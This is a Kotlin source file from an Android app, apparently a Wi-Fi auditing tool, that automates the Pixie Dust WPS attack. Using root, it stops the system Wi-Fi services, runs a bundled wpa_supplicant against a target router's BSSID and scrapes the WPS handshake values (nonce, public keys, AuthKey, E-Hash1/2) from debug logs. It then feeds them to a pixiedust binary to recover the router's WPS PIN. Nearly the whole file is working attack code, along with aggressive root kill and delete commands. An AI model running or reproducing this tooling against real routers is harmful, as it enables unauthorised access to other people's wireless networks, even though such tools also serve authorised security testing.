package com.lsd.wififrankenstein.ui.pixiedust

import android.annotation.SuppressLint
import android.content.Context
import android.net.wifi.WifiManager
import android.os.Build
import android.util.Log
import com.lsd.wififrankenstein.R
import com.topjohnwu.superuser.Shell
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.InputStreamReader

class PixieDustHelper(
    private val context: Context,
    private val callbacks: PixieDustCallbacks
) {

    companion object {
        private const val TAG = "PixieDustHelper"
        private const val CONFIG_FILE = "wpa_supplicant.conf"
        private const val DEFAULT_PIN = "12345670"
        private const val TIMEOUT = 40000L
        private const val APP_PACKAGE = "com.lsd.wififrankenstein"
    }

    private var attackJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val binaryDir = context.filesDir.absolutePath
    private val wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager

    private var supplicantProcess: Process? = null
    private var supplicantOutput: BufferedReader? = null
    private val pixieData = mutableMapOf<String, String>()
    private var pixieDataProgress = 0
    private val totalPixieDataFields = 6

    interface PixieDustCallbacks {
        fun onStateChanged(state: PixieAttackState)
        fun onProgressUpdate(message: String)
        fun onAttackCompleted(result: PixieResult)
        fun onAttackFailed(error: String, errorCode: Int)
        fun onLogEntry(logEntry: LogEntry)
    }

    fun checkRootAccess(): Boolean {
        return try {
            val shell = Shell.getShell()
            shell.isRoot && shell.isAlive
        } catch (e: Exception) {
            Log.e(TAG, "Root check failed", e)
            false
        }
    }

    fun checkBinaryFiles(): Boolean {
        val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
        val requiredBinaries = listOf(
            "wpa_supplicant$arch",
            "wpa_cli$arch",
            "pixiedust$arch",
            CONFIG_FILE
        )

        return requiredBinaries.all { fileName ->
            val file = java.io.File(binaryDir, fileName)
            val exists = file.exists() && file.canRead() && file.length() > 0
            Log.d(TAG, "Binary $fileName: exists=$exists, size=${file.length()}")
            exists
        }
    }

    fun copyBinariesFromAssets() {
        scope.launch {
            try {
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_copying_binaries))

                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
                val binaries = listOf(
                    "wpa_supplicant$arch",
                    "wpa_cli$arch",
                    "pixiedust$arch",
                    CONFIG_FILE
                )

                val libraries = listOf(
                    "libssl.so.1.1",
                    "libssl.so.3",
                    "libcrypto.so.1.1",
                    "libcrypto.so.3",
                    "libnl-3.so$arch",
                    "libnl-genl-3.so$arch",
                    "libnl-route-3.so$arch"
                )

                binaries.forEach { fileName ->
                    if (copyAssetToInternalStorage(fileName, fileName)) {
                        Shell.cmd("chmod 755 $binaryDir/$fileName").exec()
                    }
                }

                libraries.forEach { libName ->
                    copyAssetToInternalStorage(libName, libName)
                    Shell.cmd("chmod 755 $binaryDir/$libName").exec()
                }

                createLibrarySymlinks()
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_binaries_ready))

            } catch (e: Exception) {
                Log.e(TAG, "Error copying binaries", e)
                callbacks.onAttackFailed(context.getString(R.string.pixiedust_error_copying_binaries), -10)
            }
        }
    }

    private fun createLibrarySymlinks() {
        val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
        val symlinkCommands = listOf(
            "cd $binaryDir && ln -sf libnl-3.so$arch libnl-3.so",
            "cd $binaryDir && ln -sf libnl-genl-3.so$arch libnl-genl-3.so",
            "cd $binaryDir && ln -sf libnl-route-3.so$arch libnl-route-3.so"
        )

        symlinkCommands.forEach { command ->
            Shell.cmd(command).exec()
        }
    }

    private fun copyAssetToInternalStorage(assetName: String, fileName: String): Boolean {
        return try {
            context.assets.open(assetName).use { input ->
                context.openFileOutput(fileName, Context.MODE_PRIVATE).use { output ->
                    input.copyTo(output)
                }
            }
            true
        } catch (e: Exception) {
            Log.w(TAG, "Failed to copy $assetName", e)
            false
        }
    }

    fun startPixieAttack(network: WpsNetwork, wpsTimeout: Long = 40000L, extractionTimeout: Long = 30000L, computationTimeout: Long = 300000L) {
        if (attackJob?.isActive == true) {
            Log.w(TAG, "Attack already in progress")
            return
        }

        pixieData.clear()
        pixieDataProgress = 0

        attackJob = scope.launch {
            try {
                callbacks.onLogEntry(LogEntry("Starting PixieDust attack on ${network.ssid}"))

                callbacks.onStateChanged(PixieAttackState.CheckingRoot)
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_checking_root))

                if (!checkRootAccess()) {
                    callbacks.onAttackFailed(context.getString(R.string.pixiedust_root_not_available), -1)
                    return@launch
                }

                if (!checkBinaryFiles()) {
                    copyBinariesFromAssets()
                    delay(3000)

                    if (!checkBinaryFiles()) {
                        callbacks.onAttackFailed(context.getString(R.string.pixiedust_binary_files_not_available), -2)
                        return@launch
                    }
                }

                callbacks.onStateChanged(PixieAttackState.Preparing)
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_preparing_attack))

                stopExistingProcesses()
                delay(3000)

                val startTime = System.currentTimeMillis()
                val socketDir = getSocketDirectory()

                if (!startSupplicant(socketDir)) {
                    forceStopAllProcesses()
                    callbacks.onAttackFailed(context.getString(R.string.pixiedust_failed_start_supplicant), -3)
                    return@launch
                }

                delay(3000)

                callbacks.onStateChanged(PixieAttackState.ExtractingData)
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_extracting_handshake))

                performWpsRegistration(network, socketDir)
                delay(8000)

                val attackData = extractPixieData()
                if (attackData == null) {
                    Log.w(TAG, "Failed to extract complete pixie data set")
                    forceStopAllProcesses()
                    callbacks.onAttackFailed(context.getString(R.string.pixiedust_data_extraction_failed), -4)
                    return@launch
                }

                callbacks.onStateChanged(PixieAttackState.RunningAttack)
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_computing_pin))

                val pin = executePixieAttack(attackData)
                val duration = System.currentTimeMillis() - startTime

                val result = PixieResult(
                    network = network,
                    pin = pin,
                    success = pin != null,
                    duration = duration
                )

                cleanupAfterAttack()

                callbacks.onStateChanged(PixieAttackState.Completed(result))
                callbacks.onAttackCompleted(result)

                if (pin != null) {
                    callbacks.onLogEntry(LogEntry("PIN found: $pin", LogColorType.INFO))
                } else {
                    callbacks.onLogEntry(LogEntry("WPS pin not found!", LogColorType.ERROR))
                }

            } catch (e: Exception) {
                Log.e(TAG, "PixieDust attack failed", e)
                forceStopAllProcesses()
                cleanupAfterAttack()
                callbacks.onLogEntry(LogEntry("Attack failed: ${e.message}", LogColorType.ERROR))
                callbacks.onAttackFailed(context.getString(R.string.pixiedust_attack_error, e.message ?: "Unknown"), -5)
            }
        }
    }

    suspend fun cleanupAfterAttack() {
        withContext(Dispatchers.IO) {
            try {
                callbacks.onProgressUpdate(context.getString(R.string.pixiedust_cleaning_up))
                callbacks.onLogEntry(LogEntry("=== CLEANUP STARTED ===", LogColorType.INFO))

                callbacks.onLogEntry(LogEntry("Stopping our processes...", LogColorType.INFO))
                forceStopAllProcesses()
                delay(2000)

                callbacks.onLogEntry(LogEntry("Restoring system WiFi services...", LogColorType.INFO))
                restoreSystemWifiServices()
                delay(3000)

                callbacks.onLogEntry(LogEntry("Restoring WiFi state...", LogColorType.INFO))
                restoreWifiState()
                delay(3000)

                callbacks.onLogEntry(LogEntry("=== CLEANUP COMPLETED ===", LogColorType.SUCCESS))

            } catch (e: Exception) {
                Log.e(TAG, "Error during cleanup", e)
                callbacks.onLogEntry(LogEntry("Cleanup error: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private suspend fun restoreSystemWifiServices() {
        withContext(Dispatchers.IO) {
            try {
                callbacks.onLogEntry(LogEntry("Starting system WiFi services...", LogColorType.INFO))

                val restoreSettings = listOf(
                    "settings put global wifi_networks_available_notification_on 1",
                    "settings put global wifi_scan_always_enabled 1",
                    "settings put global wifi_sleep_policy 2",
                    "settings put secure wifi_watchdog_on 1"
                )

                restoreSettings.forEach { command ->
                    Shell.cmd(command).exec()
                    delay(200)
                }

                val interfaceCommands = listOf(
                    "ifconfig wlan0 up",
                    "ip link set wlan0 up"
                )

                interfaceCommands.forEach { command ->
                    Shell.cmd(command).exec()
                    delay(500)
                }

                val startServices = listOf(
                    "start wifi",
                    "start wifihal",
                    "setprop ctl.start wifi",
                    "setprop ctl.start wpa_supplicant"
                )

                startServices.forEach { command ->
                    val result = Shell.cmd(command).exec()
                    if (result.isSuccess) {
                        callbacks.onLogEntry(LogEntry("✓ $command", LogColorType.SUCCESS))
                    } else {
                        callbacks.onLogEntry(LogEntry("⚠ $command failed", LogColorType.ERROR))
                    }
                    delay(1000)
                }

                callbacks.onLogEntry(LogEntry("System WiFi services restored", LogColorType.SUCCESS))

            } catch (e: Exception) {
                Log.w(TAG, "Error restoring system services", e)
                callbacks.onLogEntry(LogEntry("Error restoring services: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    suspend fun forceStopAllProcesses() {
        withContext(Dispatchers.IO) {
            try {
                callbacks.onLogEntry(LogEntry("Force stopping all processes...", LogColorType.INFO))

                try {
                    supplicantProcess?.destroy()
                    supplicantOutput?.close()
                    supplicantProcess = null
                    supplicantOutput = null
                } catch (e: Exception) {
                    Log.w(TAG, "Error closing supplicant streams", e)
                }

                val killCommands = listOf(
                    "pkill -9 -f wpa_supplicant",
                    "pkill -9 -f wpa_cli",
                    "pkill -9 -f pixiedust",
                    "killall -9 wpa_supplicant",
                    "killall -9 wpa_cli",
                    "killall -9 pixiedust",
                    "pkill -9 -f $binaryDir",
                    "fuser -k $binaryDir/wpa_supplicant* 2>/dev/null || true",
                    "fuser -k $binaryDir/wpa_cli* 2>/dev/null || true",
                    "ps aux | grep wpa_supplicant | grep -v grep | awk '{print \$2}' | xargs kill -9 2>/dev/null || true",
                    "ps aux | grep wpa_cli | grep -v grep | awk '{print \$2}' | xargs kill -9 2>/dev/null || true"
                )

                killCommands.forEach { command ->
                    try {
                        Shell.cmd(command).exec()
                        delay(200)
                    } catch (e: Exception) {
                        Log.w(TAG, "Kill command failed: $command", e)
                    }
                }

                val socketDirs = listOf(
                    "/data/vendor/wifi/wpa/wififrankenstein/",
                    "/data/misc/wifi/wififrankenstein/"
                )

                socketDirs.forEach { dir ->
                    Shell.cmd("rm -rf $dir").exec()
                }

                callbacks.onLogEntry(LogEntry("All processes terminated", LogColorType.SUCCESS))

            } catch (e: Exception) {
                Log.w(TAG, "Error force stopping processes", e)
                callbacks.onLogEntry(LogEntry("Error stopping processes: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    fun forceCleanup() {
        scope.launch {
            forceStopAllProcesses()
            delay(1000)
            cleanupAfterAttack()
        }
    }

    private suspend fun restoreWifiState() {
        withContext(Dispatchers.IO) {
            try {
                callbacks.onLogEntry(LogEntry("Performing full WiFi reset...", LogColorType.INFO))

                val wifiResetCommands = listOf(
                    "echo 0 > /sys/class/net/wlan0/device/rf_kill",
                    "echo 1 > /sys/class/net/wlan0/device/rf_kill",
                    "echo 0 > /sys/class/net/wlan0/device/rf_kill"
                )

                wifiResetCommands.forEach { command ->
                    try {
                        Shell.cmd(command).exec()
                        delay(1000)
                    } catch (e: Exception) {
                        Log.w(TAG, "RF kill command failed: $command", e)
                    }
                }

                callbacks.onLogEntry(LogEntry("Reloading WiFi module...", LogColorType.INFO))
                val moduleCommands = listOf(
                    "rmmod wlan",
                    "sleep 2",
                    "modprobe wlan"
                )

                moduleCommands.forEach { command ->
                    try {
                        Shell.cmd(command).exec()
                        delay(2000)
                    } catch (e: Exception) {
                        Log.w(TAG, "Module command failed: $command", e)
                    }
                }

                callbacks.onLogEntry(LogEntry("Software WiFi reset...", LogColorType.INFO))
                try {
                    wifiManager.isWifiEnabled = false
                    delay(5000)
                    wifiManager.isWifiEnabled = true
                    delay(5000)
                    callbacks.onLogEntry(LogEntry("WiFi software reset completed", LogColorType.SUCCESS))
                } catch (e: Exception) {
                    Log.w(TAG, "Software WiFi reset failed", e)
                    callbacks.onLogEntry(LogEntry("Software reset failed: ${e.message}", LogColorType.ERROR))
                }

                callbacks.onLogEntry(LogEntry("Cleaning temporary files only...", LogColorType.INFO))
                val cleanupCommands = listOf(
                    "rm -rf /data/misc/wifi/wififrankenstein/",
                    "rm -rf /data/vendor/wifi/wpa/wififrankenstein/",
                    "killall -HUP wpa_supplicant 2>/dev/null || true"
                )

                cleanupCommands.forEach { command ->
                    Shell.cmd(command).exec()
                    delay(200)
                }

                callbacks.onLogEntry(LogEntry("WiFi state restored with saved networks", LogColorType.SUCCESS))

            } catch (e: Exception) {
                Log.w(TAG, "Error in full WiFi restore", e)
                callbacks.onLogEntry(LogEntry("WiFi restore error: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private fun getSocketDirectory(): String {
        return if (Build.VERSION.SDK_INT >= 28) {
            "/data/vendor/wifi/wpa/wififrankenstein/"
        } else {
            "/data/misc/wifi/wififrankenstein/"
        }
    }

    private suspend fun startSupplicant(socketDir: String): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                Log.d(TAG, "Starting wpa_supplicant")
                callbacks.onLogEntry(LogEntry("Starting wpa_supplicant", LogColorType.INFO))

                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"

                Shell.cmd("rm -rf $socketDir").exec()
                Shell.cmd("mkdir -p $socketDir").exec()
                Shell.cmd("chmod 777 $socketDir").exec()

                val command = """
                cd $binaryDir && \
                export LD_LIBRARY_PATH=$binaryDir && \
                export WPA_TRACE_LEVEL=99 && \
                ./wpa_supplicant$arch -dd -K -Dnl80211,wext,hostapd,wired -i wlan0 -c$binaryDir/$CONFIG_FILE -O$socketDir
            """.trimIndent()

                supplicantProcess = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
                supplicantOutput = BufferedReader(InputStreamReader(supplicantProcess!!.inputStream))

                scope.launch {
                    var line: String?
                    while (supplicantOutput?.readLine().also { line = it } != null) {
                        line?.let { parseLine(it) }
                    }
                    Log.d(TAG, "wpa_supplicant output ended")
                }

                val socketFile = "$socketDir/wlan0"
                val startTime = System.currentTimeMillis()
                while (System.currentTimeMillis() - startTime < 10000) {
                    if (Shell.cmd("test -S $socketFile").exec().isSuccess) {
                        Log.d(TAG, "Control socket created")
                        callbacks.onLogEntry(LogEntry("Successfully initialized wpa_supplicant", LogColorType.INFO))
                        return@withContext true
                    }
                    delay(500)
                }
                Log.e(TAG, "Failed to create control socket")
                callbacks.onLogEntry(LogEntry("Failed to create control socket", LogColorType.ERROR))
                return@withContext false
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start wpa_supplicant", e)
                callbacks.onLogEntry(LogEntry("Failed to start wpa_supplicant: ${e.message}", LogColorType.ERROR))
                return@withContext false
            }
        }
    }

    private fun parseLine(line: String) {
        Log.d("WPA-SUP", line)

        when {
            line.contains("WPS: M1 received") || line.contains("WPS: Building Message M1") -> {
                callbacks.onLogEntry(LogEntry(">>> WPS M1 Message", LogColorType.INFO))
            }
            line.contains("WPS: M2 received") || line.contains("WPS: Building Message M2") -> {
                callbacks.onLogEntry(LogEntry(">>> WPS M2 Message", LogColorType.INFO))
            }
            line.contains("WPS: M3 received") || line.contains("WPS: Building Message M3") -> {
                callbacks.onLogEntry(LogEntry(">>> WPS M3 Message", LogColorType.INFO))
            }
            line.contains("WPS: M4 received") || line.contains("WPS: Building Message M4") -> {
                callbacks.onLogEntry(LogEntry(">>> WPS M4 Message", LogColorType.INFO))
            }
            line.contains("WPS: M5 received") || line.contains("WPS: Building Message M5") -> {
                callbacks.onLogEntry(LogEntry(">>> WPS M5 Message", LogColorType.INFO))
            }
            line.contains("WPS: M6 received") || line.contains("WPS: Building Message M6") -> {
                callbacks.onLogEntry(LogEntry(">>> WPS M6 Message", LogColorType.INFO))
            }
            line.contains("WPS: M7 received") || line.contains("WPS: Building Message M7") -> {
                callbacks.onLogEntry(LogEntry(">>> WPS M7 Message", LogColorType.INFO))
            }
            line.contains("WPS: M8 received") || line.contains("WPS: Building Message M8") -> {
                callbacks.onLogEntry(LogEntry(">>> WPS M8 Message", LogColorType.INFO))
            }
            line.contains("EAPOL: enable timer tick") -> {
                callbacks.onLogEntry(LogEntry("--- New WPS cycle started ---", LogColorType.HIGHLIGHT))
            }
            line.contains("EAPOL: disable timer tick") -> {
                callbacks.onLogEntry(LogEntry("--- WPS cycle ended ---", LogColorType.NORMAL))
            }
            line.contains("Event DEAUTH") || line.contains("Event DISCONNECT") -> {
                callbacks.onLogEntry(LogEntry("Connection lost, retrying...", LogColorType.ERROR))
            }
            line.contains("Association info event") -> {
                callbacks.onLogEntry(LogEntry("Connected to AP", LogColorType.SUCCESS))
            }
            line.contains("Enrollee Nonce") && line.contains("hexdump(len=16):") -> {
                val hex = extractHexDataClean(line)
                if (hex != null) {
                    pixieData["enrolleeNonce"] = hex
                    pixieDataProgress++
                    callbacks.onLogEntry(LogEntry("✓ Enrollee Nonce ($pixieDataProgress/$totalPixieDataFields)", LogColorType.SUCCESS))
                }
            }
            line.contains("DH own Public Key") && line.contains("hexdump(len=192):") -> {
                val hex = extractHexDataClean(line)
                if (hex != null) {
                    pixieData["ownPublicKey"] = hex
                    pixieDataProgress++
                    callbacks.onLogEntry(LogEntry("✓ Own Public Key ($pixieDataProgress/$totalPixieDataFields)", LogColorType.SUCCESS))
                }
            }
            line.contains("DH peer Public Key") && line.contains("hexdump(len=192):") -> {
                val hex = extractHexDataClean(line)
                if (hex != null) {
                    pixieData["peerPublicKey"] = hex
                    pixieDataProgress++
                    callbacks.onLogEntry(LogEntry("✓ Peer Public Key ($pixieDataProgress/$totalPixieDataFields)", LogColorType.SUCCESS))
                }
            }
            line.contains("AuthKey") && line.contains("hexdump(len=32):") -> {
                val hex = extractHexDataClean(line)
                if (hex != null && !hex.contains("[REMOVED]")) {
                    pixieData["authenticationKey"] = hex
                    pixieDataProgress++
                    callbacks.onLogEntry(LogEntry("✓ AuthKey ($pixieDataProgress/$totalPixieDataFields)", LogColorType.SUCCESS))
                }
            }
            line.contains("E-Hash1") && line.contains("hexdump(len=32):") -> {
                val hex = extractHexDataClean(line)
                if (hex != null) {
                    pixieData["hashOne"] = hex
                    pixieDataProgress++
                    callbacks.onLogEntry(LogEntry("✓ E-Hash1 ($pixieDataProgress/$totalPixieDataFields)", LogColorType.SUCCESS))
                }
            }
            line.contains("E-Hash2") && line.contains("hexdump(len=32):") -> {
                val hex = extractHexDataClean(line)
                if (hex != null) {
                    pixieData["hashTwo"] = hex
                    pixieDataProgress++
                    callbacks.onLogEntry(LogEntry("✓ E-Hash2 ($pixieDataProgress/$totalPixieDataFields)", LogColorType.SUCCESS))

                    if (pixieDataProgress == totalPixieDataFields) {
                        callbacks.onLogEntry(LogEntry("🎯 ALL DATA COLLECTED: [${pixieData.keys.joinToString(", ")}]", LogColorType.HIGHLIGHT))
                    }
                }
            }
        }
    }

    private suspend fun performWpsRegistration(network: WpsNetwork, socketDir: String) {
        withContext(Dispatchers.IO) {
            try {
                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
                val socketPath = "$socketDir/wlan0"

                Log.d(TAG, "Starting WPS registration for BSSID: ${network.bssid}")
                callbacks.onLogEntry(LogEntry("Starting WPS registration for ${network.bssid}", LogColorType.INFO))

                val command = "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && ./wpa_cli$arch -g$socketPath wps_reg ${network.bssid} $DEFAULT_PIN"

                val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))

                val outputReader = BufferedReader(InputStreamReader(process.inputStream))
                val errorReader = BufferedReader(InputStreamReader(process.errorStream))

                val outputLines = mutableListOf<String>()
                val errorLines = mutableListOf<String>()

                val outputJob = scope.async {
                    try {
                        var line: String?
                        while (outputReader.readLine().also { line = it } != null) {
                            line?.let {
                                outputLines.add(it)
                                parseWpaCliLine(it)
                            }
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Error reading wpa_cli output", e)
                    }
                }

                val errorJob = scope.async {
                    try {
                        var line: String?
                        while (errorReader.readLine().also { line = it } != null) {
                            line?.let {
                                errorLines.add(it)
                                Log.w("WPA_CLI_ERR", it)
                            }
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Error reading wpa_cli error output", e)
                    }
                }

                val exitCode = process.waitFor()

                outputJob.await()
                errorJob.await()

                outputReader.close()
                errorReader.close()

                Log.d(TAG, "wpa_cli finished with exit code: $exitCode")
                callbacks.onLogEntry(LogEntry("WPS registration completed", LogColorType.INFO))

            } catch (e: Exception) {
                Log.w(TAG, "WPS registration failed", e)
                callbacks.onLogEntry(LogEntry("WPS registration failed: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private fun parseWpaCliLine(line: String) {
        Log.d("WPA_CLI", "Output: $line")
        when {
            line.contains("OK") -> {
                Log.d(TAG, "wpa_cli: Command executed successfully")
            }
            line.contains("FAIL") -> {
                Log.w(TAG, "wpa_cli: Command failed: $line")
                callbacks.onLogEntry(LogEntry("wpa_cli command failed", LogColorType.ERROR))
            }
            line.contains("WPS-") -> {
                Log.d(TAG, "wpa_cli: WPS event: $line")
                callbacks.onLogEntry(LogEntry("WPS event: $line"))
            }
        }
    }

    private suspend fun stopExistingProcesses() {
        withContext(Dispatchers.IO) {
            try {
                Log.d(TAG, "Aggressively stopping system WiFi services")
                callbacks.onLogEntry(LogEntry("Stopping system WiFi services...", LogColorType.INFO))

                callbacks.onLogEntry(LogEntry("Disabling saved network auto-connect...", LogColorType.INFO))
                val disableAutoConnect = listOf(
                    "settings put global wifi_networks_available_notification_on 0",
                    "settings put global wifi_scan_always_enabled 0",
                    "settings put global wifi_sleep_policy 0",
                    "settings put secure wifi_watchdog_on 0"
                )

                disableAutoConnect.forEach { command ->
                    Shell.cmd(command).exec()
                    delay(200)
                }

                callbacks.onLogEntry(LogEntry("Stopping system WiFi services...", LogColorType.INFO))
                val stopServices = listOf(
                    "stop wifihal",
                    "stop wifi",
                    "stop wpa_supplicant",
                    "stop dhcpcd",
                    "setprop ctl.stop wpa_supplicant",
                    "setprop ctl.stop wifi"
                )

                stopServices.forEach { command ->
                    val result = Shell.cmd(command).exec()
                    if (result.isSuccess) {
                        callbacks.onLogEntry(LogEntry("✓ $command", LogColorType.SUCCESS))
                    } else {
                        callbacks.onLogEntry(LogEntry("⚠ $command failed", LogColorType.ERROR))
                    }
                    delay(500)
                }

                callbacks.onLogEntry(LogEntry("Killing WiFi processes...", LogColorType.INFO))
                val killCommands = listOf(
                    "pkill -9 -f wpa_supplicant",
                    "pkill -9 -f hostapd",
                    "pkill -9 -f dhcpcd",
                    "pkill -9 -f wifihal",
                    "killall -9 wpa_supplicant",
                    "killall -9 hostapd",
                    "killall -9 dhcpcd",
                    "ps aux | grep wpa | grep -v grep | awk '{print $2}' | xargs kill -9",
                    "ps aux | grep wifi | grep -v grep | awk '{print $2}' | xargs kill -9"
                )

                killCommands.forEach { command ->
                    try {
                        Shell.cmd(command).exec()
                        delay(300)
                    } catch (e: Exception) {
                        Log.w(TAG, "Kill command failed: $command", e)
                    }
                }

                callbacks.onLogEntry(LogEntry("Taking down WiFi interface...", LogColorType.INFO))
                val interfaceCommands = listOf(
                    "ifconfig wlan0 down",
                    "ip link set wlan0 down",
                    "iw dev wlan0 disconnect"
                )

                interfaceCommands.forEach { command ->
                    Shell.cmd(command).exec()
                    delay(200)
                }

                callbacks.onLogEntry(LogEntry("Clearing temporary files...", LogColorType.INFO))
                val clearCommands = listOf(
                    "rm -rf /data/misc/wifi/wififrankenstein/",
                    "rm -rf /data/vendor/wifi/wpa/wififrankenstein/",
                )

                clearCommands.forEach { command ->
                    Shell.cmd(command).exec()
                }

                delay(3000)
                callbacks.onLogEntry(LogEntry("System WiFi services stopped", LogColorType.SUCCESS))

            } catch (e: Exception) {
                Log.w(TAG, "Error stopping system services", e)
                callbacks.onLogEntry(LogEntry("Error stopping services: ${e.message}", LogColorType.ERROR))
            }
        }
    }

    private suspend fun extractPixieData(): PixieAttackData? {
        return withContext(Dispatchers.IO) {
            val startTime = System.currentTimeMillis()

            while (System.currentTimeMillis() - startTime < 30000) {
                Log.d(TAG, "Current pixieData size: ${pixieData.size}, keys: ${pixieData.keys}")

                if (pixieData.size >= 6) {
                    val enrolleeNonce = pixieData["enrolleeNonce"]
                    val ownPublicKey = pixieData["ownPublicKey"]
                    val peerPublicKey = pixieData["peerPublicKey"]
                    val authenticationKey = pixieData["authenticationKey"]
                    val hashOne = pixieData["hashOne"]
                    val hashTwo = pixieData["hashTwo"]

                    if (enrolleeNonce != null && ownPublicKey != null && peerPublicKey != null &&
                        authenticationKey != null && hashOne != null && hashTwo != null) {

                        Log.d(TAG, "All required pixie data collected successfully")
                        return@withContext PixieAttackData(
                            enrolleeNonce = enrolleeNonce,
                            ownPublicKey = ownPublicKey,
                            peerPublicKey = peerPublicKey,
                            authenticationKey = authenticationKey,
                            hashOne = hashOne,
                            hashTwo = hashTwo
                        )
                    }
                }

                // Проверяем, не была ли атака отменена
                if (attackJob?.isCancelled == true) {
                    Log.d(TAG, "Attack was cancelled during data extraction")
                    return@withContext null
                }

                delay(100)
            }

            Log.w(TAG, "Timeout waiting for pixie data. Final data: $pixieData")
            forceStopAllProcesses()
            null
        }
    }

    private fun extractHexDataClean(line: String): String? {
        return try {
            val hexdumpIndex = line.indexOf("hexdump(len=")
            if (hexdumpIndex == -1) return null

            val colonIndex = line.indexOf(":", hexdumpIndex)
            if (colonIndex == -1) return null

            val hexPart = line.substring(colonIndex + 1).trim()
            if (hexPart.contains("[REMOVED]") || hexPart.contains("[NULL]")) {
                return hexPart
            }

            hexPart.replace("\\s+".toRegex(), "")
        } catch (e: Exception) {
            Log.w(TAG, "Failed to extract hex data from: $line", e)
            null
        }
    }

    @SuppressLint("LongLogTag")
    private suspend fun executePixieAttack(data: PixieAttackData): String? {
        return withContext(Dispatchers.IO) {
            try {
                callbacks.onLogEntry(LogEntry("Executing pixiedust binary", LogColorType.INFO))

                val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
                val command = "cd $binaryDir && export LD_LIBRARY_PATH=$binaryDir && " +
                        "./pixiedust$arch --force ${data.toCommandArgs()}"

                Log.d(TAG, "Executing pixie attack with command: $command")

                val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))

                val outputReader = BufferedReader(InputStreamReader(process.inputStream))
                val errorReader = BufferedReader(InputStreamReader(process.errorStream))

                val outputLines = mutableListOf<String>()
                val errorLines = mutableListOf<String>()

                val outputJob = scope.async {
                    try {
                        var line: String?
                        while (outputReader.readLine().also { line = it } != null) {
                            line?.let {
                                outputLines.add(it)
                                parsePixieDustLine(it)
                            }
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Error reading pixiedust output", e)
                    }
                }

                val errorJob = scope.async {
                    try {
                        var line: String?
                        while (errorReader.readLine().also { line = it } != null) {
                            line?.let {
                                errorLines.add(it)
                                Log.w("$TAG-PIXIEDUST_ERR", it)
                            }
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Error reading pixiedust error output", e)
                    }
                }

                val timeoutJob = scope.async {
                    delay(300000)
                    if (isProcessAlive(process)) {
                        Log.w(TAG, "PixieDust timeout reached (5 min), killing process")
                        callbacks.onLogEntry(LogEntry("PixieDust timeout - some devices need more time", LogColorType.ERROR))
                        process.destroy()
                    }
                }

                val exitCode = process.waitFor()
                timeoutJob.cancel()

                outputJob.await()
                errorJob.await()

                outputReader.close()
                errorReader.close()

                Log.d(TAG, "pixiedust finished with exit code: $exitCode")
                callbacks.onLogEntry(LogEntry("PixieDust computation completed", LogColorType.INFO))

                return@withContext parsePixieOutput(outputLines.joinToString("\n"))

            } catch (e: Exception) {
                Log.e(TAG, "PixieDust execution error", e)
                callbacks.onLogEntry(LogEntry("PixieDust execution error: ${e.message}", LogColorType.ERROR))
                null
            }
        }
    }

    private fun isProcessAlive(process: Process): Boolean {
        return try {
            process.exitValue()
            false
        } catch (e: IllegalThreadStateException) {
            true
        }
    }

    @SuppressLint("LongLogTag")
    private fun parsePixieDustLine(line: String) {
        Log.d("PIXIEDUST", "Output: $line")
        when {
            line.contains("WPS pin", ignoreCase = true) -> {
                val parts = line.split(":")
                if (parts.size >= 2) {
                    val pin = parts[1].trim()
                    Log.d(TAG, "pixiedust: PIN found: $pin")
                    pixieData["wpsPin"] = pin
                }
            }
            line.contains("not found", ignoreCase = true) -> {
                Log.w(TAG, "pixiedust: PIN not found: $line")
            }
            line.contains("error", ignoreCase = true) -> {
                Log.w(TAG, "pixiedust: Error: $line")
            }
        }
    }

    private fun parsePixieOutput(output: String): String? {
        Log.d(TAG, "Parsing pixie output (${output.length} chars)")

        val lines = output.lines()
        for (line in lines) {
            when {
                line.contains("not found", ignoreCase = true) -> {
                    Log.d(TAG, "PIN not found in line: $line")
                    return null
                }
                line.contains("WPS pin", ignoreCase = true) -> {
                    val parts = line.split(":")
                    if (parts.size >= 2) {
                        val pin = parts[1].trim()
                        Log.d(TAG, "PIN found in output: $pin")
                        return pin
                    }
                }
            }
        }

        val storedPin = pixieData["wpsPin"]
        if (storedPin != null) {
            Log.d(TAG, "Using stored PIN from parsing: $storedPin")
            return storedPin
        }

        Log.w(TAG, "No PIN found in output")
        return null
    }

    fun stopAttack() {
        Log.d(TAG, "Stopping attack manually")
        callbacks.onLogEntry(LogEntry("Attack stopped by user", LogColorType.ERROR))

        attackJob?.cancel()

        scope.launch {
            forceStopAllProcesses()
            delay(2000)
            cleanupAfterAttack()

            withContext(Dispatchers.Main) {
                callbacks.onStateChanged(PixieAttackState.Idle)
                callbacks.onProgressUpdate("Attack stopped")
            }
        }
    }

    fun cleanup() {
        stopAttack()
        scope.cancel()
    }
}